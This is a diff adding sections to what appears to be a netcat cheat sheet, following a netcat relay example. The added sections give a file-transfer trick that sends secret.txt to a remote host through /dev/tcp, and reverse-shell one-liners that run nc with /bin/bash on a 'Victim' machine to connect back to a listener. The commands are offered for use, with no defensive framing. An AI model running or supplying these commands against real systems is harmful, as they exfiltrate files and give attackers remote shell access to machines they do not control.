@@ -96,4 +96,26 @@ On Blue_Host-1 Relay:
 $ mknod mypipe p
 $ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
 
+----------------------------------------------------------------------------------------------------
+File Transfer with /dev/tcp
+On the receiving box:
+
+$ nc -lvp 1111 > devtcpfile.txt
+On the sending box:
+
+$ cat secret.txt > /dev/tcp/10.10.0.40/1111
+This method is useful for a host that does not have NETCAT available.
+
+----------------------------------------------------------------------------------------------------
+Reverse shell using NETCAT
+First listen for the shell on your device.
+
+$ nc -lvp 9999
+On Victim using -c :
+
+$ nc -c /bin/bash 10.10.0.40 9999
+On Victim using -e :
+
+$ nc -e /bin/bash 10.10.0.40 9999
+
 
